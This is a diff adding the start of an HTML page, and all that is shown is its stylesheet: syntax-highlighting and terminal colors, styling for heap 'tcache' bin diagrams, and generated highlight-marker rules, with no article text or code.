@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+/* style.css */
+:root {
+    --anchor-offset: 100px;
+    --active-addr-bg: #f6c550;
+    --active-addr-fg: #000;
+    --hl-hover-fg: #000;
+    --hl-hover-bg: #f6c550;
+    --hl-bg-default: transparent;
+    --file-name-height: 2rem;
+
+    --bg: #111118;
+    --fg: #c5c8c6;
+    --dblack : #242427;
+    --dred   : #a91d3e;
+    --dgreen : #2c893d;
+    --dyellow: #e58b38;
+    --dblue  : #2759b5;
+    --dpurple: #6b39ca;
+    --dcyan  : #137f97;
+    --dgray  : #a4adb7;
+    --lblack : #414147;
+    --lred   : #e24e46;
+    --lgreen : #8ecb4d;
+    --lyellow: #f6c550;
+    --lblue  : #4585ee;
+    --lpurple: #a35fde;
+    --lcyan  : #54d7ca;
+    --lgray  : #f5fbff;
+
+    --secondary-bg: #22222d;
+    --details-bg: #181820;
+    --outline: #303037;
+
+    --highlight-yellow: rgb(246 197 80 / 20%);
+    --highlight-red: rgb(226 78 70 / 20%);
+    --highlight-green: rgb(142 203 77 / 20%);
+
+    --sans-fonts: sans-serif;
+    --mono-fonts: 'JetBrains Mono', Monaco, Menlo, Consolas, "Liberation Mono", Courier, monospace;
+    font-family: var(--sans-fonts);
+    color: var(--fg);
+}
+
+/* we can't put details elements or lists inside paragraphs, so any <p> with a highlight block turns into a <div role="paragraph"> */
+p, [role=paragraph] {
+    margin-top: 16px;
+    margin-bottom: 16px;
+    line-height: 160%;
+    font-size: 16px;
+}
+
+* {
+    box-sizing: border-box;
+}
+p {
+    font-family: var(--sans-fonts);
+}
+h1 > .subtitle {
+    font-size: 15px;
+    font-family: var(--sans-fonts)
+}
+h2 > .subtitle {
+    font-size: 13px;
+    font-family: var(--sans-fonts);
+}
+body {
+    background-color: var(--secondary-bg);
+    margin:auto;
+    max-width: 1100px;
+}
+
+/* offset <a href="#id"> local links */
+.hl_mark_a {
+    position: relative;
+    top: calc(0px - var(--anchor-offset));
+    pointer-events: none;
+}
+.hl_mark_a > span {
+    position: relative;
+    top: var(--anchor-offset);
+}
+.hl_mark_d, .hl_mark_r, .hl_mark_a > span {
+    border-radius: 2px;
+    outline: 1px solid var(--hl-bg);
+    background-color: var(--hl-bg);
+    color: var(--hl-fg);
+    padding-top: 1px;
+}
+.hl_mark_d {
+    --hl-bg-d: var(--hl-bg);
+    --hl-fg-d: var(--hl-fg);
+    outline-width: 1px;
+}
+.hl_mark_r {
+    /* just an outline goes too far down because it assumes descenders, having an inset bottom box shadow fakes an outline */
+    --hl-bg-default: #333;
+    border-radius: 2px;
+    outline: 1px solid var(--hl-bg);
+    background-color: var(--hl-bg, #333);
+    color: var(--hl-fg);
+    padding-top: 1px;
+}
+.hl_mark_r:hover {
+    color: var(--hl-hover-fg);
+    background-color: var(--hl-hover-bg);
+}
+
+.term-container:has(a:active) {
+    --anim: unset;
+}
+.hl_mark_a:target > span {
+    animation: var(--anim);
+}
+
+@keyframes target_highlight {
+    0% {
+        color: var(--term-color);
+        background-color: var(--hl-bg-default, var(--hl-bg));
+        outline-color: var(--hl-bg-default, var(--hl-bg));
+    }
+    50% {
+        color: var(--active-addr-fg);
+        background-color: var(--active-addr-bg);
+        outline-color: var(--active-addr-bg);
+    }
+    100% {
+        color: var(--term-color);
+        background-color: var(--hl-bg-default, var(--hl-bg));
+        outline-color: var(--hl-bg-default, var(--hl-bg));
+    }
+}
+
+.syntax {
+    position: relative;
+}
+
+.syntax > pre {
+    margin-top: 0;
+    background-color: var(--bg);
+}
+.syntax pre {
+    background: var(--bg);
+    border-radius: 5px;
+    color: var(--fg);
+    word-break: break-word;
+    overflow-wrap: break-word;
+    font-family: var(--mono-fonts);
+    font-size: 12px;
+    line-height: 20px;
+    padding: 14px 18px;
+    white-space: pre-wrap;
+}
+.syntax[name] > pre {
+    padding-top: calc(14px + var(--file-name-height));
+}
+.syntax[name]::before {
+    position: absolute;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: var(--file-name-height);
+    margin: 0 10px 0 10px;
+    width: calc(100% - 20px);
+    border-bottom: 1px solid var(--secondary-bg);
+    top: 0;
+    content: attr(name);
+}
+
+span.hl {
+    background: var(--bg);
+    padding: 2px;
+    font-family: var(--mono-fonts);
+    font-size: 12px;
+    border-radius: 2px;
+}
+.n { color: var(--lgray); }
+.nc { color: var(--lgray); }
+.p { color: var(--dgray); }
+.cp { color: var(--lcyan); }
+.cpf { color: var(--lgreen); }
+.c { color: var(--dgray); } /* Comment */
+.o { color: var(--lcyan); } /* Operator */
+.cm { color: var(--dgray); } /* Comment.Multiline */
+.c1 { color: var(--lblack); } /* Comment.Single */
+.k { color: var(--lpurple); } /* Keyword */
+.kr { color: var(--lpurple); } /* Keyword.Reserved */
+.kn { color: var(--lpurple); } /* Keyword.Namespace */
+.kt { color: var(--lgray); } /* Keyword.Type */
+.s { color: var(--lgreen); } /* Literal.String */
+.se { color: var(--dcyan); }
+.s2 { color: var(--lgreen); } /* Literal.String.Double */
+.nf { color: var(--lcyan); } /* Name.Function */
+.nn { color: var(--lgray); } /* Name.Namespace */
+.nb { color: var(--lblue); } /* Name.Builtin */
+.ow { color: var(--lcyan); } /* Operator.Word */
+.w { color: var(--fg); } /* Text.Whitespace */
+.mb { color: var(--dyellow); } /* Literal.Number.Bin */
+.mf { color: var(--dyellow); } /* Literal.Number.Float */
+.mh { color: var(--dyellow); } /* Literal.Number.Hex */
+.mi { color: var(--dyellow); } /* Literal.Number.Integer */
+.mo { color: var(--dyellow); } /* Literal.Number.Oct */
+.sc { color: var(--lgreen); } /* Literal.String.Char */
+
+pre, code {
+    font-family: var(--mono-fonts);
+}
+code {
+    padding: 0px 2px 0px 2px;
+    background-color: var(--details-bg);
+    border-radius: 3px;
+    border: 1px solid var(--outline);
+}
+
+aside {
+    color: var(--dgray);
+    background-color: var(--dblack);
+    font-style: italic;
+    font-size: small;
+    padding: 3px;
+    max-width: fit-content;
+    border-radius: 3px;
+    margin: 5px 0;
+    border: 1px solid var(--bg);
+}
+ul, ol {
+    margin: 2px 0;
+}
+
+.term-container {
+    background: var(--bg);
+    border-radius: 5px;
+    color: var(--fg);
+    word-break: break-word;
+    overflow-wrap: break-word;
+    font-family: var(--mono-fonts);
+    font-size: 12px;
+    line-height: 20px;
+    padding: 14px 18px;
+    white-space: pre-wrap;
+
+    --anim: 1s ease-in-out target_highlight;
+}
+.term-container.smallable {
+    display: inline-block;
+}
+
+.term-container :visited, .term-container :link {
+    color: inherit;
+}
+
+.term-fg1 { font-weight: bold; } /* don't bold beccause it looks weird */
+.term-fg2 { color: #838887; } /* faint (decreased intensity) - same as gray really */
+.term-fg3 { font-style: italic; } /* italic */
+.term-fg4 { text-decoration: underline; } /* underline */
+.term-fg9 { text-decoration: line-through; } /* crossed-out */
+
+.term-fg30, .term-fg31, .term-fg32, .term-fg33, .term-fg34, .term-fg35, .term-fg36 {
+    color: var(--term-color);
+}
+
+.term-fg30 { --term-color: var(--lblack); } /* black (but we can't use black, so a diff color) */
+.term-fg31 { --term-color: var(--lred); } /* red */
+.term-fg32 { --term-color: var(--lgreen); } /* green */
+.term-fg33 { --term-color: var(--lyellow); } /* yellow */
+.term-fg34 { --term-color: var(--lblue); } /* blue */
+.term-fg35 { --term-color: var(--lpurple); } /* magenta */
+.term-fg36 { --term-color: var(--lcyan); } /* cyan */
+
+/* pingotux site exclusive release */
+a {
+    color: var(--lcyan);
+}
+.slightlyhidden {
+    color: var(--lblack);
+}
+.slightlyhidden a {
+    /* --dgray wasnt dark enough :( */
+    color: #73777F;
+}
+h1.codish {
+    font-family: var(--mono-fonts);
+    max-width: fit-content;
+}
+h1.holyshit {
+    font-size: 2.5em;
+    font-style: italic;
+    font-weight: 900;
+}
+h1.lessmargin {
+    margin: 10px 0 10px 0
+}
+
+.commented {
+    text-decoration: underline dotted;
+}
+
+tcache-bin-cont {
+    display: flex;
+    flex-direction: row;
+    gap: 5px;
+    margin-left: 20px;
+}
+tcache-bin {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-width: 120px;
+}
+tcache-bin > tcache-ent {
+    position: relative;
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    padding: 5px 8px;
+    background-color: var(--bin-entry-bg);
+    border: 1px solid var(--bin-entry-border);
+    border-radius: 2px;
+    margin-top: 20px;
+    font-family: var(--mono-fonts);
+}
+tcache-bin > tcache-ent > a, tcache-bin > tcache-ent > span {
+    color: black;
+}
+tcache-bin > tcache-ent > code {
+    position: absolute;
+    left: 100%;
+    margin-left: 8px;
+    width: max-content;
+    max-width: 300px;
+}
+tcache-bin > tcache-ent > code:before {
+    content: "- "
+}
+tcache-bin > tcache-ent:not(:first-child):before {
+    position: absolute;
+    top: -20px;
+    content: "↓";
+    height: 20px;
+    font-size: 14px;
+}
+tcache-bin > :first-child {
+    background-color: var(--dyellow);
+    align-items: center;
+    margin-top: 0;
+    text-align: center;
+    height: 50px;
+    max-width: 120px;
+}
+
+tcache-ent.cyn {
+    --bin-entry-bg: var(--lcyan);
+    --bin-entry-border: var(--dcyan);
+}
+tcache-ent.prp {
+    --bin-entry-bg: var(--lpurple);
+    --bin-entry-border: var(--dpurple);
+}
+tcache-ent.grn {
+    --bin-entry-bg: var(--lgreen);
+    --bin-entry-border: var(--dgreen);
+}
+tcache-ent.blu {
+    --bin-entry-bg: var(--lblue);
+    --bin-entry-border: var(--dblue);
+}
+tcache-ent.ylw {
+    --bin-entry-bg: var(--lyellow);
+    --bin-entry-border: var(--dyellow);
+}
+code {
+    color: var(--term-color, var(--fg));
+}
+
+footer {
+    padding: 10px;
+    background-color: var(--details-bg);
+}
+
+/* generated.css */
+
+/* for i in $(seq 0 51); do echo -e "#hl_mark_a_$i > span, .hl_mark_d_$i, .hl_mark_d_$i .hl_mark_r { --hl-fg: var(--hl-fg-$i); --hl-bg: var(--hl-bg-$i); }"; done | wl-copy */
+#hl_mark_a_0 > span, .hl_mark_d_0, .hl_mark_d_0 .hl_mark_r { --hl-fg: var(--hl-fg-0); --hl-bg: var(--hl-bg-0); }
+#hl_mark_a_1 > span, .hl_mark_d_1, .hl_mark_d_1 .hl_mark_r { --hl-fg: var(--hl-fg-1); --hl-bg: var(--hl-bg-1); }
+#hl_mark_a_2 > span, .hl_mark_d_2, .hl_mark_d_2 .hl_mark_r { --hl-fg: var(--hl-fg-2); --hl-bg: var(--hl-bg-2); }
+#hl_mark_a_3 > span, .hl_mark_d_3, .hl_mark_d_3 .hl_mark_r { --hl-fg: var(--hl-fg-3); --hl-bg: var(--hl-bg-3); }
+#hl_mark_a_4 > span, .hl_mark_d_4, .hl_mark_d_4 .hl_mark_r { --hl-fg: var(--hl-fg-4); --hl-bg: var(--hl-bg-4); }
+#hl_mark_a_5 > span, .hl_mark_d_5, .hl_mark_d_5 .hl_mark_r { --hl-fg: var(--hl-fg-5); --hl-bg: var(--hl-bg-5); }
+#hl_mark_a_6 > span, .hl_mark_d_6, .hl_mark_d_6 .hl_mark_r { --hl-fg: var(--hl-fg-6); --hl-bg: var(--hl-bg-6); }
+#hl_mark_a_7 > span, .hl_mark_d_7, .hl_mark_d_7 .hl_mark_r { --hl-fg: var(--hl-fg-7); --hl-bg: var(--hl-bg-7); }
+#hl_mark_a_8 > span, .hl_mark_d_8, .hl_mark_d_8 .hl_mark_r { --hl-fg: var(--hl-fg-8); --hl-bg: var(--hl-bg-8); }
+#hl_mark_a_9 > span, .hl_mark_d_9, .hl_mark_d_9 .hl_mark_r { --hl-fg: var(--hl-fg-9); --hl-bg: var(--hl-bg-9); }
+#hl_mark_a_10 > span, .hl_mark_d_10, .hl_mark_d_10 .hl_mark_r { --hl-fg: var(--hl-fg-10); --hl-bg: var(--hl-bg-10); }
+#hl_mark_a_11 > span, .hl_mark_d_11, .hl_mark_d_11 .hl_mark_r { --hl-fg: var(--hl-fg-11); --hl-bg: var(--hl-bg-11); }
+#hl_mark_a_12 > span, .hl_mark_d_12, .hl_mark_d_12 .hl_mark_r { --hl-fg: var(--hl-fg-12); --hl-bg: var(--hl-bg-12); }
+#hl_mark_a_13 > span, .hl_mark_d_13, .hl_mark_d_13 .hl_mark_r { --hl-fg: var(--hl-fg-13); --hl-bg: var(--hl-bg-13); }
+#hl_mark_a_14 > span, .hl_mark_d_14, .hl_mark_d_14 .hl_mark_r { --hl-fg: var(--hl-fg-14); --hl-bg: var(--hl-bg-14); }
+#hl_mark_a_15 > span, .hl_mark_d_15, .hl_mark_d_15 .hl_mark_r { --hl-fg: var(--hl-fg-15); --hl-bg: var(--hl-bg-15); }
+#hl_mark_a_16 > span, .hl_mark_d_16, .hl_mark_d_16 .hl_mark_r { --hl-fg: var(--hl-fg-16); --hl-bg: var(--hl-bg-16); }
+#hl_mark_a_17 > span, .hl_mark_d_17, .hl_mark_d_17 .hl_mark_r { --hl-fg: var(--hl-fg-17); --hl-bg: var(--hl-bg-17); }
+#hl_mark_a_18 > span, .hl_mark_d_18, .hl_mark_d_18 .hl_mark_r { --hl-fg: var(--hl-fg-18); --hl-bg: var(--hl-bg-18); }
+#hl_mark_a_19 > span, .hl_mark_d_19, .hl_mark_d_19 .hl_mark_r { --hl-fg: var(--hl-fg-19); --hl-bg: var(--hl-bg-19); }
+#hl_mark_a_20 > span, .hl_mark_d_20, .hl_mark_d_20 .hl_mark_r { --hl-fg: var(--hl-fg-20); --hl-bg: var(--hl-bg-20); }
+#hl_mark_a_21 > span, .hl_mark_d_21, .hl_mark_d_21 .hl_mark_r { --hl-fg: var(--hl-fg-21); --hl-bg: var(--hl-bg-21); }
+#hl_mark_a_22 > span, .hl_mark_d_22, .hl_mark_d_22 .hl_mark_r { --hl-fg: var(--hl-fg-22); --hl-bg: var(--hl-bg-22); }
+#hl_mark_a_23 > span, .hl_mark_d_23, .hl_mark_d_23 .hl_mark_r { --hl-fg: var(--hl-fg-23); --hl-bg: var(--hl-bg-23); }
+#hl_mark_a_24 > span, .hl_mark_d_24, .hl_mark_d_24 .hl_mark_r { --hl-fg: var(--hl-fg-24); --hl-bg: var(--hl-bg-24); }
+#hl_mark_a_25 > span, .hl_mark_d_25, .hl_mark_d_25 .hl_mark_r { --hl-fg: var(--hl-fg-25); --hl-bg: var(--hl-bg-25); }
+#hl_mark_a_26 > span, .hl_mark_d_26, .hl_mark_d_26 .hl_mark_r { --hl-fg: var(--hl-fg-26); --hl-bg: var(--hl-bg-26); }
+#hl_mark_a_27 > span, .hl_mark_d_27, .hl_mark_d_27 .hl_mark_r { --hl-fg: var(--hl-fg-27); --hl-bg: var(--hl-bg-27); }
+#hl_mark_a_28 > span, .hl_mark_d_28, .hl_mark_d_28 .hl_mark_r { --hl-fg: var(--hl-fg-28); --hl-bg: var(--hl-bg-28); }
+#hl_mark_a_29 > span, .hl_mark_d_29, .hl_mark_d_29 .hl_mark_r { --hl-fg: var(--hl-fg-29); --hl-bg: var(--hl-bg-29); }
+#hl_mark_a_30 > span, .hl_mark_d_30, .hl_mark_d_30 .hl_mark_r { --hl-fg: var(--hl-fg-30); --hl-bg: var(--hl-bg-30); }
+#hl_mark_a_31 > span, .hl_mark_d_31, .hl_mark_d_31 .hl_mark_r { --hl-fg: var(--hl-fg-31); --hl-bg: var(--hl-bg-31); }
+#hl_mark_a_32 > span, .hl_mark_d_32, .hl_mark_d_32 .hl_mark_r { --hl-fg: var(--hl-fg-32); --hl-bg: var(--hl-bg-32); }
+#hl_mark_a_33 > span, .hl_mark_d_33, .hl_mark_d_33 .hl_mark_r { --hl-fg: var(--hl-fg-33); --hl-bg: var(--hl-bg-33); }
+#hl_mark_a_34 > span, .hl_mark_d_34, .hl_mark_d_34 .hl_mark_r { --hl-fg: var(--hl-fg-34); --hl-bg: var(--hl-bg-34); }
+#hl_mark_a_35 > span, .hl_mark_d_35, .hl_mark_d_35 .hl_mark_r { --hl-fg: var(--hl-fg-35); --hl-bg: var(--hl-bg-35); }
+#hl_mark_a_36 > span, .hl_mark_d_36, .hl_mark_d_36 .hl_mark_r { --hl-fg: var(--hl-fg-36); --hl-bg: var(--hl-bg-36); }
+#hl_mark_a_37 > span, .hl_mark_d_37, .hl_mark_d_37 .hl_mark_r { --hl-fg: var(--hl-fg-37); --hl-bg: var(--hl-bg-37); }
+#hl_mark_a_38 > span, .hl_mark_d_38, .hl_mark_d_38 .hl_mark_r { --hl-fg: var(--hl-fg-38); --hl-bg: var(--hl-bg-38); }
+#hl_mark_a_39 > span, .hl_mark_d_39, .hl_mark_d_39 .hl_mark_r { --hl-fg: var(--hl-fg-39); --hl-bg: var(--hl-bg-39); }
+#hl_mark_a_40 > span, .hl_mark_d_40, .hl_mark_d_40 .hl_mark_r { --hl-fg: var(--hl-fg-40); --hl-bg: var(--hl-bg-40); }
+#hl_mark_a_41 > span, .hl_mark_d_41, .hl_mark_d_41 .hl_mark_r { --hl-fg: var(--hl-fg-41); --hl-bg: var(--hl-bg-41); }
+#hl_mark_a_42 > span, .hl_mark_d_42, .hl_mark_d_42 .hl_mark_r { --hl-fg: var(--hl-fg-42); --hl-bg: var(--hl-bg-42); }
+#hl_mark_a_43 > span, .hl_mark_d_43, .hl_mark_d_43 .hl_mark_r { --hl-fg: var(--hl-fg-43); --hl-bg: var(--hl-bg-43); }
+#hl_mark_a_44 > span, .hl_mark_d_44, .hl_mark_d_44 .hl_mark_r { --hl-fg: var(--hl-fg-44); --hl-bg: var(--hl-bg-44); }
+#hl_mark_a_45 > span, .hl_mark_d_45, .hl_mark_d_45 .hl_mark_r { --hl-fg: var(--hl-fg-45); --hl-bg: var(--hl-bg-45); }
+#hl_mark_a_46 > span, .hl_mark_d_46, .hl_mark_d_46 .hl_mark_r { --hl-fg: var(--hl-fg-46); --hl-bg: var(--hl-bg-46); }
+#hl_mark_a_47 > span, .hl_mark_d_47, .hl_mark_d_47 .hl_mark_r { --hl-fg: var(--hl-fg-47); --hl-bg: var(--hl-bg-47); }
+#hl_mark_a_48 > span, .hl_mark_d_48, .hl_mark_d_48 .hl_mark_r { --hl-fg: var(--hl-fg-48); --hl-bg: var(--hl-bg-48); }
+#hl_mark_a_49 > span, .hl_mark_d_49, .hl_mark_d_49 .hl_mark_r { --hl-fg: var(--hl-fg-49); --hl-bg: var(--hl-bg-49); }
+#hl_mark_a_50 > span, .hl_mark_d_50, .hl_mark_d_50 .hl_mark_r { --hl-fg: var(--hl-fg-50); --hl-bg: var(--hl-bg-50); }
+#hl_mark_a_51 > span, .hl_mark_d_51, .hl_mark_d_51 .hl_mark_r { --hl-fg: var(--hl-fg-51); --hl-bg: var(--hl-bg-51); }
+
+/* for i in $(seq 0 51); do echo -e ".term-container:has(.hl_mark_r_$i:hover) { --hl-fg-$i: var(--hl-hover-fg); --hl-bg-$i: var(--hl-hover-bg); }"; done | wl-copy */
+.term-container:has(.hl_mark_r_0:hover) { --hl-fg-0: var(--hl-hover-fg); --hl-bg-0: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_1:hover) { --hl-fg-1: var(--hl-hover-fg); --hl-bg-1: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_2:hover) { --hl-fg-2: var(--hl-hover-fg); --hl-bg-2: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_3:hover) { --hl-fg-3: var(--hl-hover-fg); --hl-bg-3: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_4:hover) { --hl-fg-4: var(--hl-hover-fg); --hl-bg-4: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_5:hover) { --hl-fg-5: var(--hl-hover-fg); --hl-bg-5: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_6:hover) { --hl-fg-6: var(--hl-hover-fg); --hl-bg-6: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_7:hover) { --hl-fg-7: var(--hl-hover-fg); --hl-bg-7: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_8:hover) { --hl-fg-8: var(--hl-hover-fg); --hl-bg-8: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_9:hover) { --hl-fg-9: var(--hl-hover-fg); --hl-bg-9: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_10:hover) { --hl-fg-10: var(--hl-hover-fg); --hl-bg-10: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_11:hover) { --hl-fg-11: var(--hl-hover-fg); --hl-bg-11: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_12:hover) { --hl-fg-12: var(--hl-hover-fg); --hl-bg-12: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_13:hover) { --hl-fg-13: var(--hl-hover-fg); --hl-bg-13: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_14:hover) { --hl-fg-14: var(--hl-hover-fg); --hl-bg-14: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_15:hover) { --hl-fg-15: var(--hl-hover-fg); --hl-bg-15: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_16:hover) { --hl-fg-16: var(--hl-hover-fg); --hl-bg-16: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_17:hover) { --hl-fg-17: var(--hl-hover-fg); --hl-bg-17: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_18:hover) { --hl-fg-18: var(--hl-hover-fg); --hl-bg-18: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_19:hover) { --hl-fg-19: var(--hl-hover-fg); --hl-bg-19: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_20:hover) { --hl-fg-20: var(--hl-hover-fg); --hl-bg-20: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_21:hover) { --hl-fg-21: var(--hl-hover-fg); --hl-bg-21: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_22:hover) { --hl-fg-22: var(--hl-hover-fg); --hl-bg-22: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_23:hover) { --hl-fg-23: var(--hl-hover-fg); --hl-bg-23: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_24:hover) { --hl-fg-24: var(--hl-hover-fg); --hl-bg-24: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_25:hover) { --hl-fg-25: var(--hl-hover-fg); --hl-bg-25: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_26:hover) { --hl-fg-26: var(--hl-hover-fg); --hl-bg-26: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_27:hover) { --hl-fg-27: var(--hl-hover-fg); --hl-bg-27: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_28:hover) { --hl-fg-28: var(--hl-hover-fg); --hl-bg-28: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_29:hover) { --hl-fg-29: var(--hl-hover-fg); --hl-bg-29: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_30:hover) { --hl-fg-30: var(--hl-hover-fg); --hl-bg-30: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_31:hover) { --hl-fg-31: var(--hl-hover-fg); --hl-bg-31: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_32:hover) { --hl-fg-32: var(--hl-hover-fg); --hl-bg-32: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_33:hover) { --hl-fg-33: var(--hl-hover-fg); --hl-bg-33: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_34:hover) { --hl-fg-34: var(--hl-hover-fg); --hl-bg-34: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_35:hover) { --hl-fg-35: var(--hl-hover-fg); --hl-bg-35: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_36:hover) { --hl-fg-36: var(--hl-hover-fg); --hl-bg-36: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_37:hover) { --hl-fg-37: var(--hl-hover-fg); --hl-bg-37: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_38:hover) { --hl-fg-38: var(--hl-hover-fg); --hl-bg-38: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_39:hover) { --hl-fg-39: var(--hl-hover-fg); --hl-bg-39: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_40:hover) { --hl-fg-40: var(--hl-hover-fg); --hl-bg-40: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_41:hover) { --hl-fg-41: var(--hl-hover-fg); --hl-bg-41: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_42:hover) { --hl-fg-42: var(--hl-hover-fg); --hl-bg-42: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_43:hover) { --hl-fg-43: var(--hl-hover-fg); --hl-bg-43: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_44:hover) { --hl-fg-44: var(--hl-hover-fg); --hl-bg-44: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_45:hover) { --hl-fg-45: var(--hl-hover-fg); --hl-bg-45: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_46:hover) { --hl-fg-46: var(--hl-hover-fg); --hl-bg-46: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_47:hover) { --hl-fg-47: var(--hl-hover-fg); --hl-bg-47: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_48:hover) { --hl-fg-48: var(--hl-hover-fg); --hl-bg-48: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_49:hover) { --hl-fg-49: var(--hl-hover-fg); --hl-bg-49: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_50:hover) { --hl-fg-50: var(--hl-hover-fg); --hl-bg-50: var(--hl-hover-bg); }
+.term-container:has(.hl_mark_r_51:hover) { --hl-fg-51: var(--hl-hover-fg); --hl-bg-51: var(--hl-hover-bg); }
+
+/* for i in $(seq 0 51); do echo -e ".term-container:has(#hl_mark_a_$i:target) .hl_mark_d_$i, .term-container:has(#hl_mark_a_$i:target) .hl_mark_d_$i .hl_mark_r { animation: var(--anim); }"; done | wl-copy */
+.term-container:has(#hl_mark_a_0:target) .hl_mark_d_0, .term-container:has(#hl_mark_a_0:target) .hl_mark_d_0 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_1:target) .hl_mark_d_1, .term-container:has(#hl_mark_a_1:target) .hl_mark_d_1 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_2:target) .hl_mark_d_2, .term-container:has(#hl_mark_a_2:target) .hl_mark_d_2 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_3:target) .hl_mark_d_3, .term-container:has(#hl_mark_a_3:target) .hl_mark_d_3 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_4:target) .hl_mark_d_4, .term-container:has(#hl_mark_a_4:target) .hl_mark_d_4 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_5:target) .hl_mark_d_5, .term-container:has(#hl_mark_a_5:target) .hl_mark_d_5 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_6:target) .hl_mark_d_6, .term-container:has(#hl_mark_a_6:target) .hl_mark_d_6 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_7:target) .hl_mark_d_7, .term-container:has(#hl_mark_a_7:target) .hl_mark_d_7 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_8:target) .hl_mark_d_8, .term-container:has(#hl_mark_a_8:target) .hl_mark_d_8 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_9:target) .hl_mark_d_9, .term-container:has(#hl_mark_a_9:target) .hl_mark_d_9 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_10:target) .hl_mark_d_10, .term-container:has(#hl_mark_a_10:target) .hl_mark_d_10 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_11:target) .hl_mark_d_11, .term-container:has(#hl_mark_a_11:target) .hl_mark_d_11 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_12:target) .hl_mark_d_12, .term-container:has(#hl_mark_a_12:target) .hl_mark_d_12 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_13:target) .hl_mark_d_13, .term-container:has(#hl_mark_a_13:target) .hl_mark_d_13 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_14:target) .hl_mark_d_14, .term-container:has(#hl_mark_a_14:target) .hl_mark_d_14 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_15:target) .hl_mark_d_15, .term-container:has(#hl_mark_a_15:target) .hl_mark_d_15 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_16:target) .hl_mark_d_16, .term-container:has(#hl_mark_a_16:target) .hl_mark_d_16 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_17:target) .hl_mark_d_17, .term-container:has(#hl_mark_a_17:target) .hl_mark_d_17 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_18:target) .hl_mark_d_18, .term-container:has(#hl_mark_a_18:target) .hl_mark_d_18 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_19:target) .hl_mark_d_19, .term-container:has(#hl_mark_a_19:target) .hl_mark_d_19 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_20:target) .hl_mark_d_20, .term-container:has(#hl_mark_a_20:target) .hl_mark_d_20 .hl_mark_r { animation: var(--anim); }
+.term-container:has(#hl_mark_a_21:target) .hl_mark_d_21, .term-container:has(#hl_mark_a_21:target) .hl_mark_d_21 .hl_mark_r { animation: var(--anim); }
